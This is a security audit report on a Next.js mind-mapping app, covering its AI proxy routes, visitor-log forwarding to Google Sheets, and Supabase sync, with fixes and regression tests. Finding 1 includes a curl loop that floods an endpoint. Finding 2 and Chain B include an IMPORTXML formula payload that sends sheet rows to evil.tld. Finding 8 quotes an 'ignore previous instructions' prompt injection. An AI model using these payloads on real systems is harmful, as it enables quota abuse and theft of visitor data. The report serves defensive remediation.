# Jorata / JMind — Security Audit & Penetration Test Report

**Date:** 2026-06-26
**Scope:** This repository only (`jorataa/jmind`) — Next.js 16 app, server API routes,
Supabase sync layer, Google Apps Script visitor log.
**Engagement type:** Authorized white-box source review (owner-authorized).
**Assessor role:** Application security / red team / DevSecOps.

---

## Executive Summary

Jorata is a **local-first** productivity / mind-mapping web app (Next.js App Router on
Vercel, React 19, Zustand). It is single-tenant by design: each visitor's data lives in
their own browser `localStorage`. Two optional server-backed features expand the attack
surface:

1. **AI proxy routes** (`/api/ai`, `/api/ai/mindmap`, `/api/ai/expand-node`) that forward
   user text to Google Gemini using a **secret server-side API key**.
2. **Visitor log** (`/api/visitor`) that enriches a request and forwards it to a Google
   Apps Script web app, which appends a row to the owner's Google Sheet.
3. **Optional Cloud Sync** via Supabase (email+password auth, RLS-protected Postgres).

The codebase is, overall, **defensively written**: the Gemini key never reaches the
client, input is length-capped, the AI tree is depth/breadth-bounded, RLS policies are
correctly scoped to `auth.uid()`, the anon key is public by design, React's default
escaping is preserved (no `dangerouslySetInnerHTML` on user data), and the one inline
script uses a strict allowlist.

The material risks are concentrated in **un-throttled, unauthenticated server routes** and
**output-side injection into Google Sheets**:

| # | Severity | Finding |
|---|----------|---------|
| 1 | **High** | AI proxy routes have no rate limiting / auth → Gemini quota & billing abuse (financial DoS) |
| 2 | **High** | Google Sheets formula (CSV) injection via visitor-log fields |
| 3 | **Medium** | Missing HTTP security headers (CSP, HSTS, X-Frame-Options, etc.) |
| 4 | **Medium** | Unauthenticated visitor endpoint + insecure default (`SECRET=""`) in Apps Script |
| 5 | **Medium** | Known-vulnerable dependencies (`next`/`postcss` advisory) |
| 6 | **Low** | Unhandled `decodeURIComponent` on a request header → 500 |
| 7 | **Low** | Weak password policy (client-only 6-char minimum) |
| 8 | **Low** | Prompt-injection / cost-amplification in AI routes |
| 9 | **Info** | Verbose backend error messages surfaced to the client |
| 10 | **Info** | API routes set no CORS allow-list (open server-to-server) |
| 11 | **Medium** | Shared Supabase backend has no capacity protection (open signup + unbounded row) — *2nd pass* |
| 12 | **Low/High** | Rate-limit keying is host-dependent (sound on Vercel, spoofable off-Vercel) — *2nd pass* |
| 13 | **Low** | No request-body size guard before `request.json()` — *2nd pass* |

There are **no SQL/NoSQL injection, no IDOR/BOLA, no XSS, no SSRF, no prototype
pollution, and no committed secrets** in the current tree. The single committed env file
(`.env.example`) carries only placeholders. Findings 11–13 come from a second, deeper pass
(sync/merge engine, deserialization, shared backend); see "Second-Pass Findings" below for
that round, including the surface it **cleared**.

---

## Attack Surface Map

```
Browser (untrusted client)
│
├── localStorage (jmind:*)  ── local-first data; no server trust placed in it
│
├── POST /api/ai             ──► callGemini() ──► generativelanguage.googleapis.com
├── POST /api/ai/mindmap     ──►   (uses secret GEMINI_API_KEY, server-only)
├── POST /api/ai/expand-node ──►
│        ▲ no auth, no rate limit, body-size capped only by char limits
│
├── POST /api/visitor        ──► fetch(GSHEET_WEBHOOK_URL) ──► Apps Script ──► Google Sheet
│        ▲ no auth, no rate limit; forwards user-controlled fields verbatim
│
└── Supabase JS (browser)    ──► supabase.co  (anon key, RLS-enforced)
         tables: profiles, user_state   (own-row policies on auth.uid())
```

Server secrets: `GEMINI_API_KEY`, `GSHEET_WEBHOOK_URL`, `GSHEET_TOKEN` (all server-only).
Public values: `NEXT_PUBLIC_SUPABASE_URL`, `NEXT_PUBLIC_SUPABASE_ANON_KEY` (by design).

No middleware (`middleware.ts` absent). All API routes run on the default Node runtime.

---

# Findings

## Finding 1 — Unauthenticated, un-throttled AI proxy → Gemini quota / billing abuse

**Severity:** High
**CVSS v3.1 estimate:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-799 (Improper Control of Interaction Frequency)

### Description
`/api/ai`, `/api/ai/mindmap`, and `/api/ai/expand-node` accept anonymous POSTs and forward
them to Gemini using the owner's secret key. There is no authentication, no per-IP rate
limit, and no global budget guard. Each route also retries up to 3× per model across 2
models, so a single request can fan out to **6 upstream calls**.

### Root Cause
The routes were designed as a "key-hiding proxy" but inherit the public reachability of any
Vercel function. The only controls are per-request size caps (`MAX_MESSAGE_CHARS`, etc.),
which bound a single request but not the request *rate*.

### Attack Scenario
An attacker discovers the endpoint (it is referenced in client JS) and scripts a loop:
```
for i in $(seq 1 100000); do
  curl -s https://TARGET/api/ai/mindmap -H 'content-type: application/json' \
    -d '{"prompt":"x"}' &
done
```
On the Gemini free tier this **exhausts the daily quota within seconds**, denying the AI
feature to every legitimate user. If the owner has billing enabled, it runs up a bill
(amplified 6× by retry/fallback).

### Safe Proof of Concept
A single unauthenticated `curl https://TARGET/api/ai -d '{"message":"hi"}'` returning a
`{"reply": "..."}` 200 demonstrates the route is open. No load test was run (would be a DoS).

### Impact
Financial loss and/or denial of the AI feature (availability). No data confidentiality
impact.

### Likelihood
High — endpoints are trivially discoverable and require no credentials.

### Remediation
1. **Rate-limit per IP** on all three routes (implemented — see `src/lib/rate-limit.ts`).
2. Add a **global circuit breaker / daily cap** counter (e.g. Upstash Redis / Vercel KV)
   so distributed abuse can't exceed a budget. The in-memory limiter is per-instance and
   is a first layer only.
3. Consider gating AI behind the existing Supabase session when sync is configured, or a
   lightweight proof-of-work / hCaptcha for anonymous use.
4. Reduce retry amplification: cap total upstream attempts per request.

### Example Patch
See `src/lib/rate-limit.ts` and the `applyRateLimit(...)` guard added to each AI route.

### Regression Test
```ts
// 11 rapid requests from one IP: the 11th must be 429.
for (let i = 0; i < 10; i++) await POST(req("1.2.3.4"));   // allowed
const res = await POST(req("1.2.3.4"));
expect(res.status).toBe(429);
```

### References
OWASP API4:2023 Unrestricted Resource Consumption; CWE-770.

---

## Finding 2 — Google Sheets formula (CSV) injection via visitor log

**Severity:** High
**CVSS v3.1 estimate:** 6.5 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
**CWE:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)

### Description
`/api/visitor` forwards several **fully attacker-controlled** fields (`name`, `referrer`,
`path`, `visitorId`, `timeZone`, `language`) to the Apps Script, which writes them verbatim
into the owner's Google Sheet via `appendRow`. The `clean()` helper trims/limits length but
does **not** neutralize a leading formula trigger (`=`, `+`, `-`, `@`, tab, CR). When the
owner opens the sheet, Google Sheets evaluates these as formulas.

### Root Cause
Output-side neutralization is missing at both boundaries (Next route and Apps Script).
Treating spreadsheet cells as inert text is the wrong mental model — a leading `=` makes a
cell executable.

### Attack Scenario
Attacker submits the name gate (or POSTs `/api/visitor` directly) with:
```json
{"event":"joined","name":"=IMPORTXML(CONCAT(\"https://evil.tld/?c=\",JOIN(\",\",A2:A99)),\"//x\")"}
```
When the owner opens the sheet, the formula exfiltrates other rows (visitor IPs/names) to
`evil.tld`. Variants: `=HYPERLINK("https://evil.tld","Click for results")` for phishing, or
`@SUM(...)`-style payloads. This is a **stored injection that crosses a trust boundary**
into the owner's account context.

### Safe Proof of Concept
Submit name `'=1+1` and observe the raw string lands in a cell that, without the leading
apostrophe guard, would render `2`. (We do not point IMPORTXML at a real collector.)

### Impact
Exfiltration of other visitors' logged data (IP, name, geo) and owner-targeted phishing,
executed in the owner's authenticated Google session.

### Likelihood
Medium-High — the name field is reachable from the public UI with no auth.

### Remediation
Prefix any cell value beginning with `= + - @` (or control chars) with a single quote `'`
(or a zero-width guard) **before** writing. Apply at both layers (defense in depth).
Implemented: `sanitizeCell()` in `/api/visitor` and a `safe_()` guard in `Code.gs`.

### Example Patch
```ts
// src/app/api/visitor/route.ts
const sanitizeCell = (v: string) =>
  /^[=+\-@\t\r]/.test(v) ? `'${v}` : v;
// applied to every user-controlled field before forwarding
```
```js
// google-apps-script/Code.gs
function safe_(v){ v = (v==null?'':String(v)); return /^[=+\-@\t\r]/.test(v) ? "'"+v : v; }
// wrap each appended cell: safe_(data.name), safe_(data.referrer), ...
```

### Regression Test
```ts
expect(sanitizeCell("=cmd")).toBe("'=cmd");
expect(sanitizeCell("normal")).toBe("normal");
```

### References
OWASP "CSV Injection"; CWE-1236.

---

## Finding 3 — Missing HTTP security headers

**Severity:** Medium
**CVSS v3.1 estimate:** 5.4 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)
**CWE:** CWE-693 (Protection Mechanism Failure), CWE-1021 (Improper Restriction of Rendered UI Layers — clickjacking)

### Description
`next.config.ts` is empty and there is no `headers()` config or middleware, so responses
ship without `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`,
`X-Content-Type-Options`, `Referrer-Policy`, or `Permissions-Policy`.

### Root Cause
Default Next.js sends none of these; they must be opted in.

### Attack Scenario
- **Clickjacking:** the app can be framed by `evil.tld` to trick a user into clicking
  destructive actions (e.g. sign-out, data merge) overlaid invisibly.
- **MIME sniffing / weakened XSS defense-in-depth** without CSP and `nosniff`.
- **HSTS absence** allows SSL-strip on first visit.

### Impact
Clickjacking, weaker XSS containment, referrer leakage of paths.

### Likelihood
Medium.

### Remediation
Add a `headers()` block in `next.config.ts` (implemented). A strict CSP for a Next app
requires care with inline styles/scripts; a baseline is provided and should be tightened to
nonces over time.

### Example Patch
See `next.config.ts` — adds `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`,
`Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy`, HSTS, and a
baseline CSP.

### Regression Test
```ts
const res = await fetch("/");
expect(res.headers.get("x-frame-options")).toBe("DENY");
expect(res.headers.get("x-content-type-options")).toBe("nosniff");
```

### References
OWASP Secure Headers Project; MDN security headers.

---

## Finding 4 — Unauthenticated visitor endpoint + insecure Apps Script default

**Severity:** Medium
**CVSS v3.1 estimate:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)
**CWE:** CWE-306 (Missing Authentication for a Critical Function), CWE-1188 (Insecure Default)

### Description
`/api/visitor` is anonymous and un-throttled, so the owner's sheet can be spammed with
arbitrary rows. The shared-secret control exists (`GSHEET_TOKEN` ↔ `SECRET`) but the Apps
Script ships with `var SECRET = "";`, which **disables the check by default**. If the owner
deploys without setting it, anyone who learns the `/exec` URL can write rows directly.

### Root Cause
Insecure default + no rate limiting on the public ingestion route.

### Attack Scenario
Automated POSTs inflate the sheet (storage/quota exhaustion of the free Apps Script tier)
and pollute analytics. Combined with Finding 2, each spam row can also carry a formula.

### Impact
Integrity/availability of the visitor log; amplifies Finding 2.

### Likelihood
Medium.

### Remediation
- Rate-limit `/api/visitor` (implemented, shared limiter).
- Make `SECRET` mandatory: reject when unset rather than allowing all. Document it as
  required in `SETUP-VISITOR-LOG.md`.

### Regression Test
```ts
const res = await POST(req("9.9.9.9")); // after exceeding the visitor limit
expect(res.status).toBe(429);
```

### References
CWE-306; OWASP API rate-limiting guidance.

---

## Finding 5 — Known-vulnerable dependencies

**Severity:** Medium
**CVSS:** advisory-dependent
**CWE:** CWE-1395 (Dependency on Vulnerable Third-Party Component)

### Description
`npm audit` reports 2 moderate advisories: `postcss < 8.5.10` (GHSA-qx2v-qp2m-jg93, XSS via
unescaped `</style>`) pulled transitively, and the bundled `next` version sits in the
flagged range.

### Status: RESOLVED
- Bumped `next` 16.2.6 → 16.2.9 and `eslint-config-next` to match.
- Added an `overrides` pin (`"postcss": "^8.5.10"`) — `next` still bundles an older
  postcss, so the override forces the patched 8.5.x (resolved to 8.5.15) and clears the
  advisory without a breaking major bump.
- Ran `npm audit fix` to clear a transitive dev-only `js-yaml` advisory.
- `npm audit` now reports **0 vulnerabilities**; `npm run build` green.

### Remaining recommendation
- Add a CI step: `npm audit --omit=dev` (fail on high) + Dependabot/Renovate so this
  doesn't regress.

### Regression Test
CI gate: `npm audit --audit-level=high` must pass.

### References
GHSA-qx2v-qp2m-jg93.

---

## Finding 6 — Unhandled `decodeURIComponent` on a request header

**Severity:** Low
**CWE:** CWE-248 (Uncaught Exception)

### Description
In `/api/visitor`, `decodeURIComponent(clean(h.get("x-vercel-ip-city"), …))` runs **outside**
the `try`. A malformed percent sequence (e.g. a lone `%`) throws `URIError`, yielding an
unhandled 500. While `x-vercel-ip-*` are normally set by Vercel infra, defense-in-depth and
non-Vercel/proxied deployments warrant guarding it.

### Remediation
Wrap decoding in a safe helper that returns the raw value on failure (implemented).

### Regression Test
```ts
expect(safeDecode("%")).toBe("%"); // does not throw
```

---

## Finding 7 — Weak password policy (client-only)

**Severity:** Low
**CWE:** CWE-521 (Weak Password Requirements)

### Description
Sign-up enforces only `password.length >= 6` in the browser (`SyncSettings.tsx`). The real
control lives in Supabase Auth settings. A 6-char minimum with no complexity/breach check is
weak, and client validation is bypassable by calling `supabase.auth.signUp` directly.

### Remediation
Raise Supabase's **minimum password length** (Auth → Policies) to ≥10 and enable
**leaked-password protection** (HIBP) in the Supabase dashboard. Treat the client check as
UX only. Document this in `SETUP.md`.

---

## Finding 8 — Prompt injection / cost amplification in AI routes

**Severity:** Low
**CWE:** CWE-1427 (Improper Neutralization of Input Used for LLM Prompting)

### Description
User text and mind-map node titles are interpolated into the Gemini system/user prompt. An
attacker can inject instructions ("ignore previous instructions…"). Because the data is the
user's own and the output is rendered as inert text (no tool calls, no HTML), impact is
limited to nonsense output and the cost angle of Finding 1. Worth noting for future features
that act on AI output.

### Remediation
Keep treating AI output as untrusted text (already done). If AI output is ever used to drive
actions, add structured validation and never execute it.

---

## Finding 9 — Verbose backend errors surfaced to client (Info)

`GeminiError.message`, Supabase `error.message`, and sync `error.message` are returned to the
UI. These are low-sensitivity here but, as a habit, map backend errors to generic
user-facing strings and log details server-side only.

## Finding 10 — No CORS allow-list on API routes (Info)

Route handlers set no `Access-Control-Allow-Origin`, so browsers enforce same-origin (good),
but server-to-server callers face no origin check. This is the same exposure as Finding 1 and
is mitigated by rate limiting + (recommended) auth.

---

# Second-Pass Findings (deep review — maximum-effort round)

A second pass focused on the client-side data plane (sync/merge engine, localStorage
deserialization, cross-tab channel, import/export, render sinks) and the shared backend.
Most of that surface proved sound — see "What the second pass cleared" below — but three
new issues and two corrections came out of it.

## Finding 11 — Shared Supabase backend has no capacity protection (open signup + unbounded row)

**Severity:** Medium
**CVSS v3.1 estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:H)
**CWE:** CWE-770 (Resource Consumption), CWE-1188 (Insecure Default), CWE-307 (Improper Restriction of Excessive Auth Attempts)

### Description
RLS protects **confidentiality** (a user can't read another user's row) but says nothing
about **capacity**. Two gaps combine:
1. The `NEXT_PUBLIC_SUPABASE_ANON_KEY` is public, so anyone can call `supabase.auth.signUp`
   — by default there is no CAPTCHA, so accounts can be scripted.
2. Neither `user_state.stores` (jsonb) nor `profiles.display_name` has any size limit at the
   app or DB layer. `upsertCloud()` writes whatever the client holds.

Every user's row lives in the owner's **single** Supabase project, sharing one quota
(database size, egress, monthly active users). So a signed-in attacker can write multi-MB
blobs to **their own** rows — fully allowed by RLS — and, by scripting signups, multiply it.

### Attack Scenario
Attacker scripts N signups against the public anon key, and for each, upserts a
~50 MB `stores` blob (or a giant `display_name`). RLS authorizes every write (it's their own
row). The owner's free-tier database / egress quota is exhausted → **cloud sync fails for all
legitimate users**, and/or the owner's Supabase bill spikes. This is a cross-tenant
resource-exhaustion DoS that the RLS-centric threat model does not cover.

### Impact
Availability of cloud sync for all users; financial cost to the owner. No confidentiality loss.

### Likelihood
Medium — requires scripting against a public key, but no credentials beyond self-registration.

### Remediation (implemented in docs/SQL)
- Add DB **CHECK constraints** capping `octet_length(stores::text)` (e.g. 512 KB) and
  `char_length(display_name)` — see updated `SETUP.md` SQL. The cap is enforced server-side by
  Postgres regardless of what the client sends.
- Enable Supabase **Attack Protection → CAPTCHA** and keep per-IP signup rate limits.
- Set Supabase **spend/usage caps** and billing alerts.

### Regression Test
```sql
-- A row over the cap must be rejected by Postgres, not just the client.
insert into user_state (user_id, stores)
values (auth.uid(), jsonb_build_object('x', repeat('a', 600000)));  -- expect: violates check constraint
```

### References
OWASP API4:2023 Unrestricted Resource Consumption; CWE-770.

---

## Finding 12 — Rate-limit keying is host-dependent (correction to round-one mitigation)

**Severity:** Low (on Vercel) / High (off-Vercel)
**CWE:** CWE-348 (Use of Less Trusted Source), CWE-807 (Reliance on Untrusted Inputs in a Security Decision)

### Description
Round one's limiter keys on `x-forwarded-for`. Per Vercel's documentation, the platform
**overwrites** `x-forwarded-for` with the real client IP and does **not** forward an external,
client-supplied value (non-Enterprise), so the key is **trustworthy on the stated Vercel
target**. However, the code is host-agnostic: on a self-hosted Node deployment, behind a
reverse proxy that passes the client header through, or on a Vercel Enterprise "trusted proxy"
setup, `x-forwarded-for` becomes **client-spoofable**, letting an attacker rotate the value
to mint a fresh bucket per request and bypass the limit — re-opening Findings 1 and 4.

### Status: NOT EXPLOITABLE on the current target
The owner confirmed **Vercel is the only deployment target**. Vercel overwrites
`x-forwarded-for` with the real client IP (non-Enterprise), so the limiter key is
trustworthy and this is **informational** for now. The assumption is documented inline in
`src/lib/rate-limit.ts` so it resurfaces if the app is ever ported off Vercel.

### Remediation (only if you leave Vercel)
Key on the platform's trusted client-IP source (`ipAddress()` from `@vercel/functions`, or the
socket peer address) and move the counter to a shared store (Vercel KV / Upstash) so the limit
is correct across serverless instances — the in-memory limiter is per-instance.

### References
Vercel docs — Request Headers (`x-forwarded-for` overwrite); CWE-348.

---

## Finding 13 — No request-body size guard before `request.json()`

**Severity:** Low
**CWE:** CWE-770 (Resource Consumption)

### Description
Each route's per-field char caps apply only **after** `await request.json()` has buffered and
parsed the whole body, so a large payload still costs memory/CPU first. Vercel caps request
bodies at the platform level (~4.5 MB), so impact is bounded, but the limit was implicit.

### Remediation (implemented)
Added `rejectOversizedBody()` (`src/lib/rate-limit.ts`), called at the top of every route to
reject on `Content-Length` (64 KB for AI routes, 16 KB for `/api/visitor`) with a 413 before
parsing.

### Regression Test
```ts
const res = await POST(reqWith({ "content-length": String(10_000_000) }));
expect(res.status).toBe(413);
```

---

## What the second pass cleared (verified NOT vulnerable)

- **Cross-user sync injection:** the cloud row is per-user (RLS), so a crafted `stores`
  payload can only affect the *same* account — self-inflicted, never another user.
- **Prototype pollution in merge:** `mergeSnapshots`/`mergeById` use object spread and `Map`,
  which define own properties rather than invoking the `__proto__` setter — `JSON.parse` +
  spread does not pollute `Object.prototype`. Rehydrate re-runs each store's sanitizer.
- **Stored-data XSS:** mind-map node labels, task titles, KPI names, display name, and AI
  chat all render as escaped React text (`{value}`); no `dangerouslySetInnerHTML` on user
  data. The only inline script validates the theme against a fixed allowlist.
- **Import path:** `handleImportFile` writes only into a fixed `STORAGE_KEYS` allowlist and
  reloads so sanitizers run — no arbitrary localStorage key write, no code execution.
- **Open redirect / tabnabbing:** all `href`/`download` sinks are blob/data URLs or internal
  nav; no user-controlled URL, no external `target="_blank"`.
- **Cross-tab channel:** `storage` listener only rehydrates known store keys from same-origin
  localStorage; not reachable cross-origin.
- **Export (`html-to-image`):** renders the user's own DOM to a PNG they download; no sink.

---

## Positive Observations (what's done right)

- **Gemini key is server-only** — never shipped to the browser; sent via header, not URL.
- **RLS policies** are correctly scoped to `auth.uid() = id/user_id` for select/insert/update.
- **Anon key treated as public** — correct Supabase model; no `service_role` key anywhere.
- **No XSS sinks** — AI/chat/name render through React escaping; no `dangerouslySetInnerHTML`
  on user data. The one inline script validates the theme against a fixed allowlist.
- **Bounded AI tree** — `normalizeAiTree` caps depth (4) and breadth (6); no prototype
  pollution (values are freshly constructed and string-coerced).
- **Input caps** on every AI route bound single-request size/cost.
- **No committed secrets**; `.gitignore` covers `.env*` and `*.pem`.

---

## Attack Chains

**Chain A — Financial DoS:** discover `/api/ai/mindmap` (in client JS) → script unauthenticated
loop (Finding 1) → 6× retry amplification → exhaust Gemini quota/budget → AI feature down for
all users + cost to owner.

**Chain B — Log poisoning → owner account exfil:** anonymous `/api/visitor` (Finding 4, no
auth) → submit name/referrer with `=IMPORTXML(...)` payload (Finding 2) → owner opens the
Google Sheet → formula runs in the owner's Google session → exfiltrates other visitors' rows
to attacker host. Two medium/high issues chain into account-context data theft.

---

## Remediation Roadmap

### Immediate (24h)
- ✅ Add per-IP rate limiting to all AI routes and `/api/visitor` (Finding 1, 4).
- ✅ Neutralize formula characters before writing to the sheet, both layers (Finding 2).
- ✅ Add baseline security headers (Finding 3).
- ✅ Guard `decodeURIComponent` (Finding 6).

### Short-term (7 days)
- Add a durable, distributed budget cap (Vercel KV / Upstash) for AI routes (Finding 1).
- Make the Apps Script `SECRET` mandatory and document it (Finding 4).
- Raise Supabase password minimum + enable leaked-password protection (Finding 7).
- Bump `next`, run `npm audit`, add CI audit gate (Finding 5).

### Long-term (30 days)
- Tighten CSP to nonce-based; remove `'unsafe-inline'` where possible.
- Optionally gate AI behind a session/proof-of-work for anonymous traffic.
- Add structured logging + alerting on 429 spikes and upstream error rates.

---

## Hardening / Architecture Recommendations
- **Security headers:** migrate the baseline CSP to nonces; add `Cross-Origin-Opener-Policy`
  and `Cross-Origin-Resource-Policy`.
- **Secrets management:** keep all secrets in Vercel env (already done); add a secret-scanning
  pre-commit hook (gitleaks) so a future `.env` can never be committed.
- **Rate limiting:** move from in-memory (per-instance) to a shared store for correctness
  across serverless instances.
- **Monitoring/logging:** alert on 429 bursts, Gemini 5xx rates, and Supabase auth failures;
  never log secrets or full request bodies.
- **CI/CD security:** add `npm audit --audit-level=high`, ESLint security rules, and a
  Dependabot/Renovate config; run a SAST (e.g. CodeQL) on PRs.
- **Automated testing:** add the regression tests above under a test runner (none is currently
  configured) and run them in CI.

---

*End of report.*